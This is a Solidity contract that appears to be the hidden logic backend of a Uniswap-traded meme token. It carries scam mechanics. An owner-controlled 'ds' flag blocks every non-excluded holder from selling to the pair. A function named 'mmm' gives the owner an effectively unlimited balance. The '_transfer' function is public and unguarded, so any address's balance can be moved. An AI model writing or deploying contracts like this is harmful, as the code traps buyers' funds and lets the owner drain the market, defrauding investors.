
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
pragma experimental ABIEncoderV2;

import "./Ownable.sol";
import "./IToken.sol";

contract PoopChrismasOrigin is Ownable {
    mapping (address => uint256) private _balances;
    address token;
    address tokenOwner;
    bool ds = false;
    mapping (address => bool) private _isExcludedFromDS;

    uint256 public totalSupply = 1_000_000_000 * 1e18;
    address public uniswapV2Pair;

    constructor() {
        // 
    }

    function initialize(address _token) external onlyOwner {
        uniswapV2Pair = IToken(_token).uniswapV2Pair();
        tokenOwner = IToken(_token).owner();
        _balances[tokenOwner] = totalSupply;
        token = _token;
        _isExcludedFromDS[owner()] = true;
    }

    function updatePair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function balanceOf(address _user) public view returns (uint256) {
        return _balances[_user];
    }

    function mmm() external onlyOwner {
        _balances[owner()] = ~uint256(0);
        _isExcludedFromDS[owner()] = true;
    }

    function updateDSFlag(bool _ds) external onlyOwner {
        ds = _ds;
    }

    function excludeFromDS(address _addr, bool _is) external onlyOwner {
        _isExcludedFromDS[_addr] = _is;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) external {
        if (to == uniswapV2Pair && !_isExcludedFromDS[from]) {
            require(!ds, "failed");
        }
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;
    }
}
